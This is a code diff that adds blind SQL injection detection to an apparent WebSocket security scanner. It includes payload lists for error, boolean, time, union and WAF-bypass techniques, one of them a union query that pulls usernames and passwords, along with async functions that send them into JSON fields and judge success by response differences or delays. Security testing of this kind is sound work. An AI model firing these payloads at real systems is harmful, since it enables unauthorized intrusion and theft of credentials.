@@ -53,6 +53,7 @@ XSS_CONFIRMED_PATTERNS = [
 
 # ── SQLi Payloads ─────────────────────────────────────────────────────────────
 SQLI_PAYLOADS = [
+    # ── Error-Based ──────────────────────────────────────
     "'",
     "' OR '1'='1",
     "' OR 1=1--",
@@ -63,7 +64,48 @@ SQLI_PAYLOADS = [
     "1' AND '1'='1",
     "admin'--",
     "' OR 'x'='x",
+
+    # ── Boolean-Based Blind ─────────────────────────────
+    "' AND 1=1--",
+    "' AND 1=2--",
+    "1 AND 1=1",
+    "1 AND 1=2",
+    "' AND 'a'='a",
+    "' AND 'a'='b",
+    "1' AND SUBSTRING(username,1,1)='a'--",
+
+    # ── Time-Based Blind ────────────────────────────────
+    "'; WAITFOR DELAY '0:0:3'--",
+    "'; SELECT SLEEP(3)--",
+    "1; SELECT pg_sleep(3)--",
+    "' OR SLEEP(3)--",
+    "1 OR 1=1 WAITFOR DELAY '0:0:3'--",
+
+    # ── Union-Based ─────────────────────────────────────
+    "' UNION SELECT NULL,NULL--",
+    "' UNION SELECT NULL,NULL,NULL--",
+    "' UNION ALL SELECT NULL--",
+    "1 UNION SELECT 1,2,3--",
+    "' UNION SELECT username,password FROM users--",
+
+    # ── WAF Bypass ──────────────────────────────────────
+    "'/**/OR/**/1=1--",
+    "' /*!OR*/ '1'='1",
+    "%27 OR %271%27=%271",
+    "' OR 1=1#",
+    "';--",
+    "' OR ''='",
+    "\\' OR 1=1--",
+    "' oR '1'='1",
+    "' Or 1=1--",
+    "'+OR+1=1--",
 ]
+
+BOOLEAN_CONFIRM_PATTERNS = [
+    # Checked in _test_boolean_sqli() — different true/false response = confirmed
+]
+
+TIME_THRESHOLD_SECONDS = 2.5  # If response takes >2.5s = time-based SQLi
 
 # ── Command Injection ─────────────────────────────────────────────────────────
 CMD_PAYLOADS = [
@@ -107,6 +149,176 @@ PROTO_PAYLOADS = [
     '{"__proto__": {"isAdmin": true, "role": "admin"}}',
     '{"constructor": {"prototype": {"admin": true}}}',
 ]
+
+
+# ── Boolean-Based SQLi Detection ─────────────────────────────────────────────
+async def _test_boolean_sqli(ws, ws_url, fast_mode=False):
+    """
+    Boolean-based blind SQLi:
+    Send TRUE condition payload → record response
+    Send FALSE condition payload → record response
+    If responses DIFFER → SQLi confirmed
+    """
+    boolean_pairs = [
+        ("' AND 1=1--",  "' AND 1=2--",  "boolean_and"),
+        ("1 AND 1=1",    "1 AND 1=2",    "boolean_numeric"),
+        ("' AND 'a'='a", "' AND 'a'='b", "boolean_string"),
+    ]
+
+    for true_payload, false_payload, label in boolean_pairs:
+        for field in ["query", "search", "username", "id", "input"]:
+            try:
+                true_msg  = json.dumps({field: true_payload})
+                false_msg = json.dumps({field: false_payload})
+
+                true_resp  = await send_recv(ws, true_msg,  timeout=4)
+                false_resp = await send_recv(ws, false_msg, timeout=4)
+
+                if not true_resp or not false_resp:
+                    continue
+
+                true_len  = len(true_resp)
+                false_len = len(false_resp)
+
+                if true_len > 0 and false_len > 0:
+                    ratio = max(true_len, false_len) / min(true_len, false_len)
+                    if ratio > 1.3 and true_resp != false_resp:
+                        ev = Evidence.make(
+                            payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
+                            request=f"TRUE msg: {true_msg}\nFALSE msg: {false_msg}",
+                            response=f"TRUE response ({true_len} bytes): {true_resp[:150]}\nFALSE response ({false_len} bytes): {false_resp[:150]}",
+                            proof=f"Boolean-based SQLi confirmed: TRUE response {true_len} bytes vs FALSE response {false_len} bytes (ratio: {ratio:.2f}x). Field: {field}",
+                            reproduce=(
+                                f"1. Connect to {ws_url}\n"
+                                f"2. Send TRUE: {true_msg}\n"
+                                f"3. Record response length/content\n"
+                                f"4. Send FALSE: {false_msg}\n"
+                                f"5. Observe different response = SQLi confirmed"
+                            )
+                        )
+                        store.add(ws_url, 'SQL Injection (Boolean-Based Blind)', 'CRITICAL',
+                            f"Boolean-based blind SQL injection confirmed.\n"
+                            f"TRUE condition ({true_len} bytes) vs FALSE condition ({false_len} bytes).\n"
+                            f"Field: {field}\n"
+                            f"TRUE payload: {true_payload}\n"
+                            f"FALSE payload: {false_payload}", ev)
+                        return True
+
+            except Exception:
+                continue
+    return False
+
+
+# ── Time-Based SQLi Detection ─────────────────────────────────────────────────
+async def _test_time_sqli(ws, ws_url):
+    """
+    Time-based blind SQLi:
+    Send SLEEP payload → if response takes >2.5s = confirmed
+    """
+    time_payloads = [
+        ("'; SELECT SLEEP(3)--",        "sleep_mysql",    "MySQL"),
+        ("'; WAITFOR DELAY '0:0:3'--",  "sleep_mssql",    "MSSQL"),
+        ("1; SELECT pg_sleep(3)--",     "sleep_postgres", "PostgreSQL"),
+        ("' OR SLEEP(3)--",             "sleep_or",       "MySQL"),
+        ("'; SELECT 1 FROM pg_sleep(3)","sleep_pg2",      "PostgreSQL"),
+    ]
+
+    for payload, label, db_hint in time_payloads:
+        for field in ["query", "search", "username", "input"]:
+            try:
+                msg = json.dumps({field: payload})
+
+                t_start = time.perf_counter()
+                resp = await send_recv(ws, msg, timeout=8)
+                elapsed = time.perf_counter() - t_start
+
+                if elapsed >= TIME_THRESHOLD_SECONDS:
+                    ev = Evidence.make(
+                        payload=payload,
+                        request=msg,
+                        response=str(resp)[:200] if resp else "(no response — server sleeping)",
+                        proof=f"Time-based SQLi: response took {elapsed:.2f}s (threshold: {TIME_THRESHOLD_SECONDS}s). DB hint: {db_hint}. Field: {field}",
+                        reproduce=(
+                            f"1. Connect to {ws_url}\n"
+                            f"2. Send: {msg}\n"
+                            f"3. Observe response delay of {elapsed:.1f}s\n"
+                            f"4. Normal response is <0.5s — delay confirms SQLi"
+                        )
+                    )
+                    store.add(ws_url, 'SQL Injection (Time-Based Blind)', 'CRITICAL',
+                        f"Time-based blind SQL injection confirmed.\n"
+                        f"Response delayed {elapsed:.2f}s using SLEEP payload.\n"
+                        f"Database hint: {db_hint}\n"
+                        f"Field: {field}\n"
+                        f"Payload: {payload}", ev)
+                    return True
+
+            except asyncio.TimeoutError:
+                ev = Evidence.make(
+                    payload=payload,
+                    request=json.dumps({field: payload}),
+                    response="(connection timed out — server was sleeping)",
+                    proof=f"Time-based SQLi: connection timed out after {TIME_THRESHOLD_SECONDS}s. DB hint: {db_hint}",
+                    reproduce=(
+                        f"1. Connect to {ws_url}\n"
+                        f"2. Send: {json.dumps({field: payload})}\n"
+                        f"3. Connection times out — server is executing SLEEP()"
+                    )
+                )
+                store.add(ws_url, 'SQL Injection (Time-Based Blind)', 'CRITICAL',
+                    f"Time-based blind SQL injection confirmed via timeout.\n"
+                    f"Database hint: {db_hint}\n"
+                    f"Payload: {payload}", ev)
+                return True
+            except Exception:
+                continue
+    return False
+
+
+# ── WAF Bypass SQLi Detection ─────────────────────────────────────────────────
+async def _test_waf_bypass_sqli(ws, ws_url):
+    """
+    Try WAF bypass SQLi payloads — if error-based patterns match = confirmed
+    """
+    waf_payloads = [
+        "'/**/OR/**/1=1--",
+        "' /*!OR*/ '1'='1",
+        "%27 OR %271%27=%271",
+        "'+OR+1=1--",
+        "' oR '1'='1",
+        "\\' OR 1=1--",
+        "' OR ''='",
+    ]
+
+    for payload in waf_payloads:
+        for field in ["query", "search", "username", "input", "q"]:
+            try:
+                msg  = json.dumps({field: payload})
+                resp = await send_recv(ws, msg, timeout=3)
+                if not resp:
+                    continue
+
+                for pattern, db_type in SQL_ERRORS:
+                    if re.search(pattern, resp.lower(), re.IGNORECASE):
+                        ev = Evidence.make(
+                            payload=payload,
+                            request=msg,
+                            response=resp[:300],
+                            proof=f"WAF bypass SQLi: DB error '{db_type}' triggered despite obfuscated payload",
+                            reproduce=(
+                                f"1. Connect to {ws_url}\n"
+                                f"2. Send WAF bypass payload: {msg}\n"
+                                f"3. Observe DB error — WAF was bypassed"
+                            )
+                        )
+                        store.add(ws_url, 'SQL Injection (WAF Bypass)', 'CRITICAL',
+                            f"SQL injection confirmed via WAF bypass technique.\n"
+                            f"Database: {db_type}\n"
+                            f"Bypass payload: {payload}", ev)
+                        return True
+            except Exception:
+                continue
+    return False
 
 
 async def run_injection_tests(ws_url: str, fast_mode: bool = False) -> list:
@@ -157,6 +369,24 @@ async def run_injection_tests(ws_url: str, fast_mode: bool = False) -> list:
                                 results.append('sqli')
                                 log.warning(f"CRITICAL: SQL Injection on {ws_url}")
                             return results  # Stop — confirmed
+
+            # ── Boolean-Based SQLi ────────────────────────────────────────
+            if not results:
+                bool_found = await _test_boolean_sqli(ws, ws_url, fast_mode)
+                if bool_found:
+                    results.append('sqli_boolean')
+
+            # ── Time-Based SQLi ───────────────────────────────────────────
+            if not results and not fast_mode:
+                time_found = await _test_time_sqli(ws, ws_url)
+                if time_found:
+                    results.append('sqli_time')
+
+            # ── WAF Bypass SQLi ───────────────────────────────────────────
+            if not results:
+                waf_found = await _test_waf_bypass_sqli(ws, ws_url)
+                if waf_found:
+                    results.append('sqli_waf')
 
             # ── XSS — only in non-JSON context ────────────────────────────
             for payload in XSS_PAYLOADS:
